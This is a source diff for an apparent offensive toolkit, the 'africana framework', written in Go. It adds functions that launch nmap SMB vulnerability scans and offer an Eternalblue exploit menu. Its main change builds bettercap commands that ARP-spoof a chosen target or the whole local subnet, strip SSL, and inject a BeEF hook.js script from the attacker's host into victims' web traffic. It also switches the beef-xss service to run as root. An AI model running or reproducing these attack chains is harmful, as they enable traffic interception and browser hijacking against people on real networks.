@@ -8,6 +8,7 @@ import (
     "strings"
     "io/ioutil"
     "bcolors"
+    "menus"
     "subprocess"
 )
 
@@ -32,7 +33,6 @@ func NmapVulnscan(userTarget string) {
 func SmbVulnscan(userTarget string) {
     fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Trying smb nmap vuln scan on " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
     subprocess.PopenTwo(`nmap -sT -sV -Pn -p 445 --script=smb-vuln* --stats-every 10s %s`, userTarget)
-    //fmt.Println()
 }
 
 func SmbMapscan(userTarget string) {
@@ -48,9 +48,7 @@ func RpcEnumscan(userTarget string) {
 }
 
 func SmbExploit(userTarget string) {
-    fmt.Println(bcolors.BLUE + "\n           [ " + bcolors.GREEN + bcolors.UNDERL + "Select a number from the table below" + bcolors.ENDC + bcolors.BLUE + " ]\n" + bcolors.ENDC)
-    fmt.Println(bcolors.BLUE + "[ 1..............Launch Eternalblue Exploit..............] " + bcolors.ENDC)
-    fmt.Println(bcolors.BLUE + "[ 0................Exit & Go To Main Menu................] " + bcolors.ENDC)
+    menus.MenuThreeOne()
     fmt.Print(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
     fmt.Scan(&userInput)
     switch userInput {
@@ -64,10 +62,7 @@ func SmbExploit(userTarget string) {
 }
 
 func PacketSniffer(userTarget string) {
-    fmt.Println(bcolors.BLUE + "\n           [ " + bcolors.GREEN + bcolors.UNDERL + "Select a number from the table below" + bcolors.ENDC + bcolors.BLUE + " ]\n" + bcolors.ENDC)
-    fmt.Println(bcolors.BLUE + "[ 1........for Inital Target (All Traffick Sniff)........] " + bcolors.ENDC)
-    fmt.Println(bcolors.BLUE + "[ 2......All Internall IPS (Sniff All Local Subnet)......] " + bcolors.ENDC)
-    fmt.Println(bcolors.BLUE + "[ 0...............Exit & Go To Main Menu.................] " + bcolors.ENDC)
+    menus.MenuThreeTwo()
     fmt.Print(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
     fmt.Scan(&userInput)
     switch userInput {
@@ -90,6 +85,7 @@ func PacketsResponder() {
     }
     backUp := "/etc/responder/Responder.conf.bak_africana"
     if _, err := os.Stat(backUp); os.IsNotExist(err) {
+        fmt.Println()
         subprocess.Popen(`ip address`)
         fmt.Printf(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lhost" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "%s", userLhostIp + bcolors.GREEN + ")# " + bcolors.ENDC)
         reader := bufio.NewReader(os.Stdin)
@@ -125,10 +121,7 @@ func BeefBettercap(userTarget string) {
         fmt.Println("Error getting default userLhostIp:", err)
         os.Exit(1)
     }
-    fmt.Println(bcolors.BLUE + "\n           [ " + bcolors.GREEN + bcolors.UNDERL + "Select a number from the table below" + bcolors.ENDC + bcolors.BLUE + " ]\n" + bcolors.ENDC)
-    fmt.Println(bcolors.BLUE + "[ 1........for Inital Target (All Traffick Sniff)........] " + bcolors.ENDC)
-    fmt.Println(bcolors.BLUE + "[ 2......All Internall IPS (Sniff All Local Subnet)......]" + bcolors.ENDC)
-    fmt.Println(bcolors.BLUE + "[ 0...............Exit & Go To Main Menu.................] " + bcolors.ENDC)
+    menus.MenuThreeThree()
     fmt.Print(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
     fmt.Scan(&userInput)
     switch userInput {
@@ -139,6 +132,7 @@ func BeefBettercap(userTarget string) {
         if _, err := os.Stat(backUp); os.IsNotExist(err) {
             fmt.Print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "What password to set for beef-xss service" + bcolors.GREEN + ")# " + bcolors.ENDC)
             fmt.Scan(&userPass)
+            fmt.Println()
             filePath := "/etc/beef-xss/config.yaml"
             subprocess.Popen(`cp /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
             content, err := ioutil.ReadFile(filePath)
@@ -155,29 +149,56 @@ func BeefBettercap(userTarget string) {
                 return
             }
         }
-        subprocess.PopenThree(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; sleep 3; bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set arp.spoof on; set net.sniff.verbose true; net.sniff on; set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn,*amazon.com; dns.spoof on; ticker on"; systemctl stop beef-xss.service; systemctl --no-pager status`, userLhostIp, userTarget)
+        fmt.Println()
+        subprocess.Popen(`ip address`)
+        fmt.Printf(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.GREEN + ")# " + bcolors.ENDC)
+        reader := bufio.NewReader(os.Stdin)
+        userLhost, _ := reader.ReadString('\n')
+        userLhost = strings.TrimSpace(userLhost)
+        if userLhost == "" {
+            userLhost = userLhostIp
+        }
+        fmt.Println()
+        subprocess.PopenFive(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set http.proxy.sslstrip true; set https.proxy.sslstrip true; set arp.spoof.targets %s; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true"`, userLhostIp, userLhostIp, userLhostIp, userTarget)
     case "2":
         backUp := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(backUp); os.IsNotExist(err) {
             fmt.Print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "What password to set for beef-xss service" + bcolors.GREEN + ")# " + bcolors.ENDC)
             fmt.Scan(&userPass)
+            fmt.Println()
             filePath := "/etc/beef-xss/config.yaml"
-            subprocess.Popen(`cp /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
-            content, err := ioutil.ReadFile(filePath)
+            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana; cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
+            _, err := ioutil.ReadFile(filePath)
             if err != nil {
                 fmt.Println("Error reading file:", err)
                 return
             }
-            oldString  := `passwd: "beef"`
-            newString  := fmt.Sprintf(`passwd: "%s"`, userPass)
-            updatedContent := strings.ReplaceAll(string(content), oldString, newString)
-            err = ioutil.WriteFile(filePath, []byte(updatedContent), os.ModePerm)
-            if err != nil {
-                fmt.Println("Error writing to file:", err)
-                return
+            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
+            filesToReplacements := map[string]map[string]string{
+                "/etc/beef-xss/config.yaml": {
+                    `passwd: "beef"`: newString,
+                },
+                "/usr/lib/systemd/system/beef-xss.service": {
+                    `User=beef-xss`: `User=root`,
+                },
             }
+
+            utils.Editors(filesToReplacements)
+            }
+            subprocess.Popen(`systemctl daemon-reload`)
+        fmt.Println()
+        subprocess.Popen(`ip address`)
+        fmt.Printf(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.GREEN + ")# " + bcolors.ENDC)
+        reader := bufio.NewReader(os.Stdin)
+        userLhost, _ := reader.ReadString('\n')
+        userLhost = strings.TrimSpace(userLhost)
+        if userLhost == "" {
+            userLhost = userLhostIp
         }
-        subprocess.PopenTwo(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; sleep 3; bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof on; set net.sniff.verbose true; net.sniff on; set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn,*amazon.com; dns.spoof on; ticker on"; systemctl stop beef-xss.service; systemctl --no-pager status`, userLhostIp)
+        fmt.Println()
+        subprocess.PopenFour(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true"`, userLhostIp, userLhostIp, userLhostIp)
+        subprocess.Popen(`rm -rf /etc/beef-xss/config.yaml; rm -rf /usr/lib/systemd/system/beef-xss.service; mv /etc/beef-xss/config.yaml.bak_africana /etc/beef-xss/config.yaml; mv /usr/lib/systemd/system/beef-xss.service.bak_africana /usr/lib/systemd/system/beef-xss.service; systemctl stop beef-xss.service; systemctl --no-pager status beef-xss`)
+        fmt.Println()
     default:
         fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
     }
